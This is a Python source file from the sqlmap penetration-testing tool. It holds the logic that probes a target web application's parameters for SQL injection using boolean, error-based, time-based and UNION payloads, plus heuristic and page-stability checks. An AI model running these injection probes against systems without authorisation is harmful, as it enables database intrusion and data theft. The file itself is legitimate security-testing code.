#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import socket
import time

from lib.core.agent import agent
from lib.core.common import aliasToDbmsEnum
from lib.core.common import Backend
from lib.core.common import beep
from lib.core.common import extractRegexResult
from lib.core.common import findDynamicContent
from lib.core.common import Format
from lib.core.common import getComparePageRatio
from lib.core.common import getCompiledRegex
from lib.core.common import getSortedInjectionTests
from lib.core.common import getUnicode
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import removeDynamicContent
from lib.core.common import showStaticWords
from lib.core.common import trimAlphaNum
from lib.core.common import wasLastRequestDBMSError
from lib.core.common import wasLastRequestHTTPError
from lib.core.common import DynamicContentItem
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.datatype import advancedDict
from lib.core.datatype import injectionDict
from lib.core.enums import HTTPMETHOD
from lib.core.enums import NULLCONNECTION
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import sqlmapConnectionException
from lib.core.exception import sqlmapGenericException
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapUserQuitException
from lib.core.session import setDynamicMarkings
from lib.core.settings import CONSTANT_RATIO
from lib.core.settings import UNKNOWN_DBMS_VERSION
from lib.core.settings import LOWER_RATIO_BOUND
from lib.core.settings import UPPER_RATIO_BOUND
from lib.core.threads import getCurrentThreadData
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.request.templates import getPageTemplate
from lib.techniques.inband.union.test import unionTest
from lib.techniques.inband.union.use import configUnion

def checkSqlInjection(place, parameter, value):
    # Store here the details about boundaries and payload used to
    # successfully inject
    injection = injectionDict()

    # Set the flag for sql injection test mode
    kb.testMode = True

    for test in getSortedInjectionTests():
        try:
            if kb.endDetection:
                break

            title = test.title
            stype = test.stype
            clause = test.clause

            if stype == 3:
                configUnion(test.request.char)

                if test.request.columns == "[COLSTART]-[COLSTOP]":
                    if conf.uCols is None:
                        continue
                    else:
                        title = title.replace("[COLSTART]", str(conf.uColsStart))
                        title = title.replace("[COLSTOP]", str(conf.uColsStop))

                if "[CHAR]" in title:
                    title = title.replace("[CHAR]", conf.uChar)

            # Skip test if the user's wants to test only for a specific
            # technique
            if conf.technique and isinstance(conf.technique, int) and stype != conf.technique:
                debugMsg = "skipping test '%s' because the user " % title
                debugMsg += "specified to test only for "
                debugMsg += "%s" % PAYLOAD.SQLINJECTION[conf.technique]
                logger.debug(debugMsg)
                continue

            # Skip test if the risk is higher than the provided (or default)
            # value
            # Parse test's <risk>
            if test.risk > conf.risk:
                debugMsg = "skipping test '%s' because the risk " % title
                debugMsg += "is higher than the provided"
                logger.debug(debugMsg)
                continue

            # Skip test if the level is higher than the provided (or default)
            # value
            # Parse test's <level>
            if test.level > conf.level:
                debugMsg = "skipping test '%s' because the level " % title
                debugMsg += "is higher than the provided"
                logger.debug(debugMsg)
                continue

            # Skip DBMS-specific test if it does not match either the
            # previously identified or the user's provided DBMS (either
            # from program switch or from parsed error message(s))
            if "details" in test and "dbms" in test.details:
                dbms = test.details.dbms
            else:
                dbms = None

            if dbms is not None:
                if injection.dbms is not None and injection.dbms != dbms:
                    debugMsg = "skipping test '%s' because " % title
                    debugMsg += "the back-end DBMS identified is "
                    debugMsg += "%s" % injection.dbms
                    logger.debug(debugMsg)

                    continue

                if conf.dbms is not None and conf.dbms.lower() != dbms.lower():
                    debugMsg = "skipping test '%s' because " % title
                    debugMsg += "the provided DBMS is %s" % conf.dbms
                    logger.debug(debugMsg)

                    continue

                if len(Backend.getErrorParsedDBMSes()) > 0 and dbms not in Backend.getErrorParsedDBMSes() and kb.skipOthersDbms is None:
                    msg = "parsed error message(s) showed that the "
                    msg += "back-end DBMS could be %s. " % Format.getErrorParsedDBMSes()
                    msg += "Do you want to skip test payloads specific for other DBMSes? [Y/n]"

                    if conf.realTest or readInput(msg, default="Y") in ("y", "Y"):
                        kb.skipOthersDbms = Backend.getErrorParsedDBMSes()

                if kb.skipOthersDbms and dbms not in kb.skipOthersDbms:
                    debugMsg = "skipping test '%s' because " % title
                    debugMsg += "the parsed error message(s) showed "
                    debugMsg += "that the back-end DBMS could be "
                    debugMsg += "%s" % Format.getErrorParsedDBMSes()
                    logger.debug(debugMsg)

                    continue

            # Skip test if it is the same SQL injection type already
            # identified by another test
            if injection.data and stype in injection.data:
                debugMsg = "skipping test '%s' because " % title
                debugMsg += "the payload for %s has " % PAYLOAD.SQLINJECTION[stype]
                debugMsg += "already been identified"
                logger.debug(debugMsg)
                continue

            # Skip test if it does not match the same SQL injection clause
            # already identified by another test
            clauseMatch = False

            for clauseTest in clause:
                if injection.clause is not None and clauseTest in injection.clause:
                    clauseMatch = True
                    break

            if clause != [ 0 ] and injection.clause and injection.clause != [ 0 ] and not clauseMatch:
                debugMsg = "skipping test '%s' because the clauses " % title
                debugMsg += "differs from the clause already identified"
                logger.debug(debugMsg)
                continue

            # Skip test if the user provided custom column
            # range and this is not a custom UNION test
            if conf.uCols is not None and hasattr(test.request, "columns") and test.request.columns != "[COLSTART]-[COLSTOP]":
                debugMsg = "skipping test '%s' because custom " % title
                debugMsg += "UNION columns range was provided"
                logger.debug(debugMsg)
                continue

            infoMsg = "testing '%s'" % title
            logger.info(infoMsg)

            # Parse test's <request>
            comment = agent.getComment(test.request)
            fstPayload = agent.cleanupPayload(test.request.payload, value)
            fstPayload = unescaper.unescape(fstPayload, dbms=dbms)

            for boundary in conf.boundaries:
                injectable = False

                # Skip boundary if the level is higher than the provided (or
                # default) value
                # Parse boundary's <level>
                if boundary.level > conf.level:
                    continue

                # Skip boundary if it does not match against test's <clause>
                # Parse test's <clause> and boundary's <clause>
                clauseMatch = False

                for clauseTest in test.clause:
                    if clauseTest in boundary.clause:
                        clauseMatch = True
                        break

                if test.clause != [ 0 ] and boundary.clause != [ 0 ] and not clauseMatch:
                    continue

                # Skip boundary if it does not match against test's <where>
                # Parse test's <where> and boundary's <where>
                whereMatch = False

                for where in test.where:
                    if where in boundary.where:
                        whereMatch = True
                        break

                if not whereMatch:
                    continue

                # Parse boundary's <prefix>, <suffix> and <ptype>
                prefix = boundary.prefix if boundary.prefix else ""
                suffix = boundary.suffix if boundary.suffix else ""
                ptype = boundary.ptype

                # If the previous injections succeeded, we know which prefix,
                # suffix and parameter type to use for further tests, no
                # need to cycle through the boundaries for the following tests
                condBound = (injection.prefix is not None and injection.suffix is not None)
                condBound &= (injection.prefix != prefix or injection.suffix != suffix)
                condType = injection.ptype is not None and injection.ptype != ptype

                if condBound or condType:
                    continue

                # For each test's <where>
                for where in test.where:
                    templatePayload = None
                    vector = None

                    # Threat the parameter original value according to the
                    # test's <where> tag
                    if where == 1:
                        origValue = value
                    elif where == 2:
                        # Use different page template than the original
                        # one as we are changing parameters value, which
                        # will likely result in a different content
                        origValue = "-%s" % randomInt()
                        templatePayload = agent.payload(place, parameter, newValue=origValue, where=where)
                    elif where == 3:
                        origValue = ""

                    kb.pageTemplate, kb.errorIsNone = getPageTemplate(templatePayload, place)

                    # Forge request payload by prepending with boundary's
                    # prefix and appending the boundary's suffix to the
                    # test's ' <payload><comment> ' string
                    boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)
                    boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                    boundPayload = agent.cleanupPayload(boundPayload, value)
                    reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                    # Perform the test's request and check whether or not the
                    # payload was successful
                    # Parse test's <response>
                    for method, check in test.response.items():
                        check = agent.cleanupPayload(check, value)

                        # In case of boolean-based blind SQL injection
                        if method == PAYLOAD.METHOD.COMPARISON:
                            sndPayload = agent.cleanupPayload(test.response.comparison, value)
                            sndPayload = unescaper.unescape(sndPayload, dbms=dbms)

                            # Forge response payload by prepending with
                            # boundary's prefix and appending the boundary's
                            # suffix to the test's ' <payload><comment> '
                            # string
                            boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)
                            boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                            boundPayload = agent.cleanupPayload(boundPayload, value)
                            cmpPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                            # Useful to set kb.matchRatio at first based on
                            # the False response content
                            kb.matchRatio = None
                            _ = Request.queryPage(cmpPayload, place, raise404=False)

                            # If in the comparing stage there was an error
                            # then anything non-error will be considered as True
                            if kb.errorIsNone and kb.matchRatio is None:
                                kb.matchRatio = LOWER_RATIO_BOUND

                            # Perform the test's True request
                            trueResult = Request.queryPage(reqPayload, place, raise404=False)

                            if trueResult:
                                falseResult = Request.queryPage(cmpPayload, place, raise404=False)

                                # Perform the test's False request
                                if not falseResult:
                                    infoMsg = "%s parameter '%s' is '%s' injectable " % (place, parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                        # In case of error-based SQL injection
                        elif method == PAYLOAD.METHOD.GREP:
                            # Perform the test's request and grep the response
                            # body for the test's <grep> regular expression
                            reqBody, _ = Request.queryPage(reqPayload, place, content=True, raise404=False)
                            output = extractRegexResult(check, reqBody, re.DOTALL | re.IGNORECASE)

                            if output:
                                result = output.replace(kb.misc.space, " ") == "1"

                                if result:
                                    infoMsg = "%s parameter '%s' is '%s' injectable " % (place, parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                        # In case of time-based blind or stacked queries
                        # SQL injections
                        elif method == PAYLOAD.METHOD.TIME:
                            # Perform the test's request
                            trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)

                            if trueResult:
                                # Confirm test's results
                                trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)

                                if trueResult:
                                    infoMsg = "%s parameter '%s' is '%s' injectable " % (place, parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                        # In case of UNION query SQL injection
                        elif method == PAYLOAD.METHOD.UNION:
                            # Test for UNION injection and set the sample
                            # payload as well as the vector.
                            # NOTE: vector is set to a tuple with 6 elements,
                            # used afterwards by Agent.forgeInbandQuery()
                            # method to forge the UNION query payload

                            # Force back-end DBMS according to the current
                            # test value for proper payload unescaping
                            Backend.forceDbms(dbms)

                            configUnion(test.request.char, test.request.columns)

                            if not Backend.getIdentifiedDbms():
                                warnMsg = "using unescaped version of the test "
                                warnMsg += "because of zero knowledge of the "
                                warnMsg += "back-end DBMS"
                                logger.warn(warnMsg)

                            # Test for UNION query SQL injection
                            reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)

                            if isinstance(reqPayload, basestring):
                                infoMsg = "%s parameter '%s' is '%s' injectable" % (place, parameter, title)
                                logger.info(infoMsg)

                                injectable = True

                                # Overwrite 'where' because it can be set
                                # by unionTest() directly
                                where = vector[6]

                            # Reset forced back-end DBMS value
                            Backend.flushForcedDbms()

                    # If the injection test was successful feed the injection
                    # object with the test's details
                    if injectable is True:
                        # Feed with the boundaries details only the first time a
                        # test has been successful
                        if injection.place is None or injection.parameter is None:
                            if place == PLACE.UA:
                                injection.parameter = conf.agent
                            else:
                                injection.parameter = parameter

                            injection.place = place
                            injection.ptype = ptype
                            injection.prefix = prefix
                            injection.suffix = suffix
                            injection.clause = clause

                        if vector is None and "vector" in test and test.vector is not None:
                            vector = "%s%s" % (test.vector, comment)

                        # Feed with test details every time a test is successful
                        injection.data[stype] = advancedDict()
                        injection.data[stype].title = title
                        injection.data[stype].payload = agent.removePayloadDelimiters(reqPayload)
                        injection.data[stype].where = where
                        injection.data[stype].vector = vector
                        injection.data[stype].comment = comment
                        injection.data[stype].templatePayload = templatePayload
                        injection.data[stype].matchRatio = kb.matchRatio

                        injection.conf.textOnly = conf.textOnly
                        injection.conf.string = conf.string
                        injection.conf.regexp = conf.regexp

                        if hasattr(test, "details"):
                            for dKey, dValue in test.details.items():
                                if dKey == "dbms":
                                    injection.dbms = Backend.setDbms(dValue)
                                elif dKey == "dbms_version" and injection.dbms_version is None:
                                    injection.dbms_version = Backend.setVersion(dValue)
                                elif dKey == "os" and injection.os is None:
                                    injection.os = Backend.setOs(dValue)

                        if conf.beep or conf.realTest:
                            beep()

                        # There is no need to perform this test for other
                        # <where> tags
                        break

                if injectable is True:
                    # There is no need to perform this test with others
                    # boundaries
                    break

        except KeyboardInterrupt:
            warnMsg = "Ctrl+C detected in detection phase"
            logger.warn(warnMsg)

            message = "How do you want to proceed? [(S)kip test/(e)nd detection phase/(n)ext parameter/(q)uit]"
            test = readInput(message, default="S")

            if not test or test[0] in ("s", "S"):
                pass
            elif test[0] in ("n", "N"):
                return None
            elif test[0] in ("e", "E"):
                kb.endDetection = True
            elif test[0] in ("q", "Q"):
                raise sqlmapUserQuitException

    # Return the injection object
    if injection.place is not None and injection.parameter is not None:
        return injection
    else:
        return None

def heuristicCheckSqlInjection(place, parameter):
    if kb.nullConnection:
        debugMsg = "heuristic checking skipped "
        debugMsg += "because NULL connection used"
        logger.debug(debugMsg)
        return

    prefix = ""
    suffix = ""

    if conf.prefix or conf.suffix:
        if conf.prefix:
            prefix = conf.prefix

        if conf.suffix:
            suffix = conf.suffix

    payload = "%s%s%s" % (prefix, randomStr(length=10, alphabet=['"', '\'', ')', '(']), suffix)
    payload = agent.payload(place, parameter, newValue=payload)
    Request.queryPage(payload, place, content=True, raise404=False)

    result = wasLastRequestDBMSError()

    infoMsg = "heuristic test shows that %s " % place
    infoMsg += "parameter '%s' might " % parameter

    if result:
        infoMsg += "be injectable (possible DBMS: %s)" % (Format.getErrorParsedDBMSes() or UNKNOWN_DBMS_VERSION)
        logger.info(infoMsg)
    else:
        infoMsg += "not be injectable"
        logger.warn(infoMsg)

    return result

def simpletonCheckSqlInjection(place, parameter, value):
    """
    This is a function for the quickest and simplest 
    sql injection check (e.g. AND 1=1) - only works
    with integer parameters
    """

    result = False
    randInt = randomInt()

    if value.isdigit():
        payload = "%s AND %d=%d" % (value, randInt, randInt)
    else:
        return False

    payload = agent.payload(place, parameter, value, payload)
    firstPage, _ = Request.queryPage(payload, place, content=True, raise404=False)

    if not (wasLastRequestDBMSError() or wasLastRequestHTTPError()):
        if getComparePageRatio(kb.originalPage, firstPage, filtered=True) > CONSTANT_RATIO:
            payload = "%s AND %d=%d" % (value, randInt, randInt+1)

            payload = agent.payload(place, parameter, value, payload)
            secondPage, _ = Request.queryPage(payload, place, content=True, raise404=False)
            result = getComparePageRatio(firstPage, secondPage, filtered=True) <= CONSTANT_RATIO

    infoMsg = "simpleton test shows that %s " % place
    infoMsg += "parameter '%s' might " % parameter

    if result:
        infoMsg += "be injectable"
        logger.info(infoMsg)
    else:
        infoMsg += "not be injectable"
        logger.warn(infoMsg)

    return result

def checkDynParam(place, parameter, value):
    """
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """

    kb.matchRatio = None

    infoMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, getUnicode(randInt))
    dynResult = Request.queryPage(payload, place, raise404=False)

    if True == dynResult:
        return False

    infoMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, getUnicode(randInt))
    dynResult = Request.queryPage(payload, place, raise404=False)

    return not dynResult

def checkDynamicContent(firstPage, secondPage):
    """
    This function checks for the dynamic content in the provided pages
    """

    if kb.nullConnection:
        debugMsg = "dynamic content checking skipped "
        debugMsg += "because NULL connection used"
        logger.debug(debugMsg)
        return

    if any(page is None for page in (firstPage, secondPage)):
        warnMsg = "can't check dynamic content "
        warnMsg += "because of lack of page content"
        logger.critical(warnMsg)
        return

    seqMatcher = getCurrentThreadData().seqMatcher
    seqMatcher.set_seq1(firstPage)
    seqMatcher.set_seq2(secondPage)

    # In case of an intolerable difference turn on dynamicity removal engine
    if seqMatcher.quick_ratio() <= UPPER_RATIO_BOUND:
        findDynamicContent(firstPage, secondPage)

        count = 0
        while not Request.queryPage():
            count += 1

            if count > conf.retries:
                warnMsg = "target url is too dynamic. "
                warnMsg += "switching to --text-only. "
                logger.warn(warnMsg)

                conf.textOnly = True
                return

            warnMsg = "target url is heavily dynamic"
            warnMsg += ", sqlmap is going to retry the request"
            logger.critical(warnMsg)

            secondPage, _ = Request.queryPage(content=True)
            findDynamicContent(firstPage, secondPage)

        setDynamicMarkings(kb.dynamicMarkings)

def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page two times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    infoMsg = "testing if the url is stable, wait a few seconds"
    logger.info(infoMsg)

    firstPage = kb.originalPage # set inside checkConnection()
    time.sleep(1)
    secondPage, _ = Request.queryPage(content=True)

    kb.pageStable = (firstPage == secondPage)

    if kb.pageStable:
        if firstPage:
            logMsg = "url is stable"
            logger.info(logMsg)
        else:
            errMsg = "there was an error checking the stability of page "
            errMsg += "because of lack of content. please check the "
            errMsg += "page request results (and probable errors) by "
            errMsg += "using higher verbosity levels"
            raise sqlmapNoneDataException, errMsg

    else:
        warnMsg = "url is not stable, sqlmap will base the page "
        warnMsg += "comparison on a sequence matcher. If no dynamic nor "
        warnMsg += "injectable parameters are detected, or in case of "
        warnMsg += "junk results, refer to user's manual paragraph "
        warnMsg += "'Page comparison' and provide a string or regular "
        warnMsg += "expression to match on"
        logger.warn(warnMsg)

        message = "how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] "
        if not conf.realTest:
            test = readInput(message, default="C")
        else:
            test = None

        if test and test[0] in ("q", "Q"):
            raise sqlmapUserQuitException

        elif test and test[0] in ("s", "S"):
            showStaticWords(firstPage, secondPage)

            message = "please enter value for parameter 'string': "
            test = readInput(message)

            if test:
                conf.string = test

                if kb.nullConnection:
                    debugMsg = "turning off NULL connection "
                    debugMsg += "support because of string checking"
                    logger.debug(debugMsg)

                    kb.nullConnection = None
            else:
                errMsg = "Empty value supplied"
                raise sqlmapNoneDataException, errMsg

        elif test and test[0] in ("r", "R"):
            message = "please enter value for parameter 'regex': "
            test = readInput(message)

            if test:
                conf.regex = test

                if kb.nullConnection:
                    debugMsg = "turning off NULL connection "
                    debugMsg += "support because of regex checking"
                    logger.debug(debugMsg)

                    kb.nullConnection = None
            else:
                errMsg = "Empty value supplied"
                raise sqlmapNoneDataException, errMsg

        else:
            checkDynamicContent(firstPage, secondPage)

    return kb.pageStable

def checkString():
    if not conf.string:
        return True

    infoMsg = "testing if the provided string is within the "
    infoMsg += "target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if conf.string not in page:
        warnMsg = "you provided '%s' as the string to " % conf.string
        warnMsg += "match, but such a string is not within the target "
        warnMsg += "URL page content original request, sqlmap will "
        warnMsg += "keep going anyway"
        logger.warn(warnMsg)

    return True

def checkRegexp():
    if not conf.regexp:
        return True

    infoMsg = "testing if the provided regular expression matches within "
    infoMsg += "the target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if not re.search(conf.regexp, page, re.I | re.M):
        warnMsg = "you provided '%s' as the regular expression to " % conf.regexp
        warnMsg += "match, but such a regular expression does not have any "
        warnMsg += "match within the target URL page content, sqlmap "
        warnMsg += "will keep going anyway"
        logger.warn(warnMsg)

    return True

def checkNullConnection():
    """
    Reference: http://www.wisec.it/sectou.php?id=472f952d79293
    """

    infoMsg = "testing NULL connection to the target url"
    logger.info(infoMsg)

    try:
        page, headers = Request.getPage(method=HTTPMETHOD.HEAD)

        if not page and 'Content-Length' in headers:
            kb.nullConnection = NULLCONNECTION.HEAD

            infoMsg = "NULL connection is supported with HEAD header"
            logger.info(infoMsg)
        else:
            page, headers = Request.getPage(auxHeaders={"Range": "bytes=-1"})

            if page and len(page) == 1 and 'Content-Range' in headers:
                kb.nullConnection = NULLCONNECTION.RANGE

                infoMsg = "NULL connection is supported with GET header "
                infoMsg += "'%s'" % kb.nullConnection
                logger.info(infoMsg)

    except sqlmapConnectionException, errMsg:
        errMsg = getUnicode(errMsg)
        raise sqlmapConnectionException, errMsg

    return kb.nullConnection is not None

def checkConnection(suppressOutput=False):
    try:
        socket.gethostbyname(conf.hostname)
    except socket.gaierror:
        errMsg = "host '%s' does not exist" % conf.hostname
        raise sqlmapConnectionException, errMsg

    if not suppressOutput:
        infoMsg = "testing connection to the target url"
        logger.info(infoMsg)

    try:
        page, _ = Request.queryPage(content=True)
        kb.originalPage = kb.pageTemplate = page

        kb.errorIsNone = False

        if not kb.originalPage:
            errMsg = "unable to retrieve page content"
            raise sqlmapConnectionException, errMsg
        elif wasLastRequestDBMSError():
            warnMsg = "there is a DBMS error found in the HTTP response body"
            warnMsg += "which could interfere with the results of the tests"
            logger.warn(warnMsg)
        elif wasLastRequestHTTPError():
            warnMsg = "the web server responded with an HTTP error code "
            warnMsg += "which could interfere with the results of the tests"
            logger.warn(warnMsg)
        else:
            kb.errorIsNone = True
    except sqlmapConnectionException, errMsg:
        errMsg = getUnicode(errMsg)
        raise sqlmapConnectionException, errMsg

    return True
